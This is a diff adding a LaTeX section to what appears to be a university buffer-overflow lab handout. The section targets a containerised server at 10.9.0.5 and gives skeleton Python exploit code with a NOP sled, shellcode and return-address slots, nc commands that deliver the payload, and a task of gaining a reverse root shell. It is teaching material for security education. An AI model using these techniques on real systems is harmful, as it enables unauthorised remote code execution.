@@ -1,0 +1,232 @@
+
+% *******************************************
+% SECTION
+% *******************************************
+\section{Task 2: Level-1 Attack} 
+
+
+When we start the containers using the included 
+\texttt{docker-compose.yml} file, four containers will be 
+running, representing four levels of difficulties. 
+We will work on Level 1 in this task. 
+
+
+% -------------------------------------------
+% SUBSECTION
+% -------------------------------------------
+\subsection{Server} 
+
+Our first target runs on \texttt{10.9.0.5} (the port 
+number is \texttt{9090}), 
+and the vulnerable program \texttt{stack} is a 
+\ifdefined\arm
+64-bit
+\else
+32-bit 
+\fi
+program). Let's first send a benign message to this server.
+We will see the following messages printed out by the target container (the
+actual messages you see may be different).
+
+\ifdefined\arm
+\begin{lstlisting}
+// On the VM (i.e., the attacker machine)
+$ echo hello | nc 10.9.0.5 9090
+Press Ctrl+C
+
+// Messages printed out by the container
+server-1-10.9.0.5  | Got a connection from 10.9.0.1
+server-1-10.9.0.5  | Starting stack
+server-1-10.9.0.5  | Input size: 6
+server-1-10.9.0.5  | Frame pointer (x29) inside foo():  0x0000fffffffff110
+server-1-10.9.0.5  | Frame pointer (x29) inside bof():  0x0000fffffffff080
+server-1-10.9.0.5  | Buffer's address inside bof():     0x0000fffffffff0a0
+\end{lstlisting}
+
+As you can see from the printout, the buffer's address is larger than the 
+\texttt{bof()} function's frame pointer. Since the return
+address is stored at (frame pointer + 8), the buffer is clearly
+placed above the return address. This is different from the x86/amd64
+architecture, where the buffer is stored below the 
+return address. This introduces a challenge that does not exist
+in the x86/amd64 architecture: how to modify the
+return address using the buffer overflow? 
+
+\else
+\begin{lstlisting}
+// On the VM (i.e., the attacker machine)
+$ echo hello | nc 10.9.0.5 9090
+Press Ctrl+C
+
+// Messages printed out by the container
+server-1-10.9.0.5 | Got a connection from 10.9.0.1
+server-1-10.9.0.5 | Starting stack
+server-1-10.9.0.5 | Input size: 6
+server-1-10.9.0.5 | Frame Pointer (ebp) inside bof():  0xffffdb88    (*@\ding{80}@*)
+server-1-10.9.0.5 | Buffer's address inside bof():     0xffffdb18    (*@\ding{80}@*)
+server-1-10.9.0.5 | ==== Returned Properly ====
+\end{lstlisting}
+\fi
+
+
+The server will accept up to \texttt{517} bytes of the data from the 
+user, and that will cause a buffer overflow. Your job 
+is to construct your payload to exploit this vulnerability. If 
+you save your payload in a file, you can send the payload
+to the server using the following command.
+
+\begin{lstlisting}
+$ cat <file> | nc 10.9.0.5 9090
+\end{lstlisting}
+
+If the server program returns, it will print out \texttt{"Returned Properly"}.
+If this message is not printed out, the \texttt{stack} program has probably crashed. 
+The server will still keep running, taking new connections.  
+
+For this task, the information essential for buffer-overflow 
+attacks is printed out as hints to students: 
+the value of the frame pointer and the address
+of the buffer. 
+The frame point register is called \texttt{ebp}, \texttt{rbp},
+and \texttt{x29} for the x86, amd64, arm64 architectures, respectively. 
+You can use the provided information to construct your payload. 
+
+
+\paragraph{Added randomness.} We have added a little bit of randomness
+in the program, so different students are likely to see different values
+for the buffer address and frame pointer. The values only change 
+when the container restarts, so as long as you keep the 
+container running, you will see the same numbers (the numbers 
+seen by different students are still different). This randomness
+is different from the address-randomization countermeasure. Its sole
+purpose is to make students' work a little bit different. 
+
+
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection{Writing Exploit Code and Launching Attack} 
+
+To exploit the buffer-overflow vulnerability in the target program,
+we need to prepare a payload, and save it inside a file (we will use 
+\texttt{badfile} as the file name in this document). 
+We will use a Python program to do that.
+We provide a skeleton program called \texttt{exploit.py}, which
+is included in the lab setup file. 
+The code is incomplete, and students need to replace some of the essential 
+values in the code. 
+
+
+\newcommand{\needtochange}{\ding{73} Need to change \ding{73}}
+
+
+\ifdefined\arm
+% For arm64 
+\begin{lstlisting}[language=python, caption={The skeleton exploit code (\texttt{exploit.py})}]
+#!/usr/bin/python3
+import sys
+
+# You can copy and paste the shellcode from Task 1
+shellcode = (
+  ""                     # (*@\needtochange@*)
+).encode('latin-1')
+
+# Fill the content with NOP's (0xD503201F is NOP instruction in arm64)
+nop = (0xD503201F).to_bytes(4, byteorder='little')
+content = bytearray(517)
+for offset in range(int(500/4)):
+   content[offset*4:offset*4 + 4] = nop
+
+##################################################################
+# Put the shellcode somewhere in the payload
+start = 0                # (*@\needtochange@*)
+content[start:start + len(shellcode)] = shellcode
+
+# Decide the return address value
+# and put it somewhere in the payload
+ret    = 0x00            # (*@\needtochange@*)
+offset = 0               # (*@\needtochange@*)
+
+# Use 4 for 32-bit address and 8 for 64-bit address
+content[offset:offset + 8] = (ret).to_bytes(8,byteorder='little')
+##################################################################
+
+# Write the content to a file
+with open('badfile', 'wb') as f:
+  f.write(content)
+\end{lstlisting}
+
+\else
+% For x86 
+\begin{lstlisting}[language=python, caption={The skeleton exploit code (\texttt{exploit.py})}]
+#!/usr/bin/python3
+import sys
+
+# You can copy and paste the shellcode from Task 1
+shellcode = (
+  ""                     # (*@\needtochange@*)
+).encode('latin-1')
+
+# Fill the content with NOP's
+content = bytearray(0x90 for i in range(517))
+
+##################################################################
+# Put the shellcode somewhere in the payload
+start =  0               # (*@\needtochange@*)
+content[start:start + len(shellcode)] = shellcode
+
+# Decide the return address value 
+# and save it somewhere in the payload
+ret    = 0x00            # (*@\needtochange@*)
+offset = 0               # (*@\needtochange@*)
+
+# Use 4 for 32-bit address, 8 for 64-bit address
+content[offset:offset + 4] = (ret).to\_bytes(4,byteorder='little')
+##################################################################
+
+# Write the content to a file
+with open('badfile', 'wb') as f:
+  f.write(content)
+\end{lstlisting}
+\fi
+
+\ifdefined\arm
+It should be noted that the buffer overflow problem in the 
+vulnerable program is caused by the \texttt{memcpy()} function, 
+which, unlike
+\texttt{strcpy()}, does not terminate at zero. Therefore,
+in your input, you can have zeros.  Actually, as we can
+see from the printout, the two most significant 
+bytes of each address are zeros. 
+\fi
+
+
+After you finish the above program, run it. This will generate
+the contents for \texttt{badfile}. Then feed it to
+the vulnerable server. If your exploit is implemented correctly, the 
+command you put inside your shellcode will be executed. If your 
+command generates some outputs, you should be able to see
+them from the container window. Please provide proofs to show that you
+can successfully get the vulnerable server to run 
+your commands.
+
+\begin{lstlisting}
+$./exploit.py   // create the badfile
+$ cat badfile | nc 10.9.0.5 9090
+\end{lstlisting}
+ 
+
+\paragraph{Reverse shell.}
+We are not interested in running some pre-determined commands. We 
+want to get a root shell on the target server, so we can 
+type any command we want. Since we are on a remote machine,
+if we simply get the server to run \texttt{/bin/sh}, we won't be able to
+control the shell program. Reverse shell is a typical
+technique to solve this problem. Section~\ref{sec:guildelines} provides 
+detailed instructions on how to run a reverse shell.
+Please modify the command string in your shellcode, so you can
+get a reverse shell on the target server. 
+Please include screenshots and explanation in your lab report.
+
+
+
